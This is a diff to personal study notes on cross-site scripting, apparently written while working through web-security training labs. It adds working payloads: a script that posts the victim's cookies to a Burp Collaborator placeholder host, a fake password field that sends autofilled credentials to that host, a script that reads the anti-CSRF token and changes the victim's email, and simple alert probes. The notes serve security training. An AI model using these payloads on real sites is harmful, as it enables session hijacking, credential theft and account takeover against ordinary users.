@@ -31,15 +31,113 @@ If the user visits the URL constructed by the attacker, then the attacker's scri
 
     
     alert(document.domain)
+    
+                                        <script>
+                                    fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
+                                    method: 'POST',
+                                    mode: 'no-cors',
+                                    body:document.cookie
+                                    });
+                                    </script>
 
 scripting using burp collaborator: 
 
-                      <script>
-                      fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
-                      method: 'POST',
-                      mode: 'no-cors',
-                      body:document.cookie
-                      });
-                      </script>
-                      
+
+
+
+                           
+                                                   ## Exploiting cross-site scripting to capture passwords
+ # These days, many users have password managers that auto-fill their passwords.
+ # You can take advantage of this by creating a password input, reading out the auto-filled password, and sending it to your own domain.
+ # This technique avoids most of the problems associated with stealing cookies, and can even gain access to every other account where the victim has reused the same password. 
+ 
+ # The primary disadvantage of this technique is that it only works on users who have a password manager that performs password auto-fill. (Of course, if a user doesn't have a password saved you can still attempt to obtain their password through an on-site phishing attack, but it's not quite the same.) 
+ 
+ 
+                           <input name=username id=username>
+                          <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
+                          method:'POST',
+                          mode: 'no-cors',
+                          body:username.value+':'+this.value
+                          });">
+                          
+                          
+                                                 ## Exploiting cross-site scripting to perform CSRF
+                                                 
+ # Anything a legitimate user can do on a web site, you can probably do too with XSS. Depending on the site you're targeting, you might be able to make a victim send a message, accept a friend request, commit a backdoor to a source code repository, or transfer some Bitcoin. 
+
+# Some websites allow logged-in users to change their email address without re-entering their password. If you've found an XSS vulnerability, you can make it trigger this functionality to change the victim's email address to one that you control, and then trigger a password reset to gain access to the account. 
+
+# This type of exploit is typically referred to as cross-site request forgery (CSRF), which is slightly confusing because CSRF can also occur as a standalone vulnerability. When CSRF occurs as a standalone vulnerability, it can be patched using strategies like anti-CSRF tokens. However, these strategies do not provide any protection if an XSS vulnerability is also present
+
+
+                          <script>
+                          var req = new XMLHttpRequest();
+                          req.onload = handleResponse;
+                          req.open('get','/my-account',true);
+                          req.send();
+                          function handleResponse() {
+                              var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+                              var changeReq = new XMLHttpRequest();
+                              changeReq.open('post', '/my-account/change-email', true);
+                              changeReq.send('csrf='+token+'&email=test@test.com')
+                          };
+                          </script>
+
+                          This will make anyone who views the comment issue a POST request to change their email address to test@test.com. 
+                          
+                          
+                          
+                                <SOURCE-CODE>
+                        <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
+                            <label>Email</label>
+                            <input required type="email" name="email" value="">
+                            <input required type="hidden" name="csrf" value="UVQTBTZWsVWuXuFh3vVVzfWBhJG5VbuI">
+                            <button class='button' type='submit'> Update email </button>
+                        </form>    
+                        
+  If you view the source for the page, you'll see the following information:
+
+   >> You need to issue a POST request to /my-account/change-email, with a parameter called email.
+   >> There's an anti-CSRF token in a hidden input called token.
+   
+   This means your exploit will need to load the user account page, extract the CSRF token, and then use the token to change the victim's email address. 
+   
+   
+                             <script>
+                          var req = new XMLHttpRequest();
+                          req.onload = handleResponse;
+                          req.open('get','/my-account',true);
+                          req.send();
+                          function handleResponse() {
+                              var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+                              var changeReq = new XMLHttpRequest();
+                              changeReq.open('post', '/my-account/change-email', true);
+                              changeReq.send('csrf='+token+'&email=test@test.com')
+                          };
+                          </script>
+
+                          This will make anyone who views the comment issue a POST request to change their email address to test@test.com
+                          
+                          
+                          ## Reflected XSS in different contexts
+#  There are many different varieties of reflected cross-site scripting. The location of the reflected data within the application's response determines what type of payload is required to exploit it and might also affect the impact of the vulnerability.
+
+# In addition, if the application performs any validation or other processing on the submitted data before it is reflected, this will generally affect what kind of XSS payload is needed.                           
+
+
+# When testing for reflected and stored XSS, a key task is to identify the XSS context:
+
+   >> The location within the response where attacker-controllable data appears.
+   >> Any input validation or other processing that is being performed on that data by the application.
+                          
+                          # XSS between HTML tags
+Some useful ways of executing JavaScript are: 
+  <script>alert(document.domain)</script>
+  <img src=1 onerror=alert(1)>
+
+                        
+                        
+
+                          
                       
